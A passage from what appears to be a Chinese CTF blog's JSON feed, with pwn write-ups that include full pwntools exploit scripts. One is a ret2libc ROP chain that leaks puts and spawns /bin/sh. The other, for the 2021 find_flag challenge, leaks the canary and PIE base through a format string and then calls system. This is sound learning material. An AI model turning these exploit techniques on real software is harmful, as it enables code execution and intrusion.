class=\"token comment\"># gdb.attach(p)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.27.so'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'your gift!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gift<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libc_base <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sys <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>binsh <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>但是我本地的 libc 下载来，还是打不通，真的不知道啊啊啊啊啊啊</p>\n<p>能打通本地的 exp</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmux'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'splitw'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'-h'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> local <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>pop_rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x401443</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>main <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>gift <span class=\"token operator\">=</span> <span class=\"token number\">0x40125D</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>b <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p32<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    v6 <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span><span class=\"token number\">100</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'number:\\n'</span><span class=\"token punctuation\">,</span>p32<span class=\"token punctuation\">(</span>v6<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'your gift!\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>gift<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>puts_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>puts_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>libcbase <span class=\"token operator\">=</span> puts_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>addr_system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>addr_binsh <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>pop_rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>addr_binsh<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>addr_system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>os: 早知道 libcsearcher 能打通，谁会掉头发！！！！</p>\n",
            "tags": [
                "pie",
                "got改写",
                "随机数检查"
            ]
        },
        {
            "id": "https://yhuanhuan01.github.io/2023/08/02/find-flag/",
            "url": "https://yhuanhuan01.github.io/2023/08/02/find-flag/",
            "title": "find_flag",
            "date_published": "2023-08-02T10:44:10.000Z",
            "content_html": "<h1 id=\"题目复现深育杯-2021find_flag\"><a class=\"markdownIt-Anchor\" href=\"#题目复现深育杯-2021find_flag\">#</a> 题目复现 ——[深育杯 2021] find_flag</h1>\n<p>pie 与 canary 同时开启，并且有格式化字符串。</p>\n<h3 id=\"检查程序\"><a class=\"markdownIt-Anchor\" href=\"#检查程序\">#</a> 检查程序：</h3>\n<p><img data-src=\"/img/find_flag/image-20230609204936112.png\" alt=\"image-20230609204936112\"></p>\n<p>保护很全面。</p>\n<p><img data-src=\"/img/find_flag/image-20230609205227082.png\" alt=\"image-20230609205227082\"></p>\n<p>可以看的出，在第一处有格式化字符串漏洞。</p>\n<h3 id=\"ida分析\"><a class=\"markdownIt-Anchor\" href=\"#ida分析\">#</a> IDA 分析：</h3>\n<p><img data-src=\"/img/find_flag/image-20230609205448884.png\" alt=\"image-20230609205448884\"></p>\n<p>看了一下 mian 函数，将函数重命名，pwn 是我们有漏洞的地方。</p>\n<p><img data-src=\"/img/find_flag/image-20230609205602697.png\" alt=\"image-20230609205602697\"></p>\n<p>可以看到 gets 函数可以进行栈溢出，但是有 canary 保护，所以我们需要泄露 canary，可以利用格式化字符串去泄露 canary 并覆写在栈上。</p>\n<p><img data-src=\"/img/find_flag/image-20230609205729803.png\" alt=\"image-20230609205729803\"></p>\n<p>发现 backdoor。但是开了 pie，我们应该无法利用后们，但是好在<strong>只读变量（const 修饰的）和字符串变量</strong>放入<strong> rodata</strong> 区。还是可以利用的。</p>\n<h3 id=\"gdb分析\"><a class=\"markdownIt-Anchor\" href=\"#gdb分析\">#</a> gdb 分析:</h3>\n<p>打断点在 printf 处（不知到为什么不能在 main 函数处大不了断点，很奇怪</p>\n<p><img data-src=\"/img/find_flag/image-20230609210601700.png\" alt=\"image-20230609210601700\"></p>\n<p>一直步到下图处</p>\n<p><img data-src=\"/img/find_flag/image-20230609210758887.png\" alt=\"image-20230609210758887\"></p>\n<p>看栈信息，很明显能看到 canary——&gt;</p>\n<blockquote>\n<p>0b:0058│             0x7fffffffdd18 ◂— 0x121203e586d31600</p>\n</blockquote>\n<p><img data-src=\"/img/find_flag/image-20230609210832637.png\" alt=\"image-20230609210832637\"></p>\n<p>看一下距格式化字符串的偏移。</p>\n<p><img data-src=\"/img/find_flag/image-20230609211002101.png\" alt=\"image-20230609211002101\"></p>\n<p>但是难点不是在泄露 canary，而是在泄露基址上去，需要了解 pie 和栈，可以看到，在 rbp 下面刚好有一个我们能泄露函数基址，但是为什么是他呢？</p>\n<p>考虑因为这个地址代表了我们的 main 函数结尾的一个部分的地址，我们可以通过这个地址进而计算出栈的基址。</p>\n<p><img data-src=\"/img/find_flag/image-20230609211705133.png\" alt=\"image-20230609211705133\"></p>\n<p>接下来就是确定偏移了（须注意的一点就是需要在 gets 函数输入后，在查看栈的情况，这样更好确定。</p>\n<p><img data-src=\"/img/find_flag/image-20230609211905134.png\" alt=\"image-20230609211905134\"></p>\n<h3 id=\"exp构造环节\"><a class=\"markdownIt-Anchor\" href=\"#exp构造环节\">#</a> exp 构造环节:</h3>\n<p>既然我们找到了，我们就构造 payload1 去泄露 canary 和基址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>paylaod1 <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p---%19$p'</span></pre></td></tr></table></figure><p>在构造 rop 链的准备。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Base <span class=\"token operator\">=</span> base <span class=\"token operator\">-</span> <span class=\"token number\">0x146F</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>system <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>catflag <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x2004</span> <span class=\"token comment\"># robata 中的字符串</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#ROPgadget --binary file --only 'pop|ret'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>rdi <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x14E3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>ret <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x101A</span></pre></td></tr></table></figure><h3 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp：</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>local <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span> local<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\tp <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'ff'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tp <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.anna.nssctf.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28068</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./ff'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload1 <span class=\"token operator\">=</span> <span class=\"token string\">b'%17$p---%19$p'</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'you, '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>canary <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'---'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>base <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>Base <span class=\"token operator\">=</span> base <span class=\"token operator\">-</span> <span class=\"token number\">0x146F</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>system <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>catflag <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x2004</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#ropgadget</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>rdi <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x14E3</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>ret <span class=\"token operator\">=</span> Base <span class=\"token operator\">+</span> <span class=\"token number\">0x101A</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x38</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>catflag<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'else? '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"结果\"><a class=\"markdownIt-Anchor\" href=\"#结果\">#</a> 结果：</h3>\n<p><img data-src=\"/img/find_flag/image-20230609212855635.png\" alt=\"image-20230609212855635\"></p>\n",
            "tags": [
                "pie",
                "canary",
                "格式化字符串漏洞"
            ]
        }
    ]
}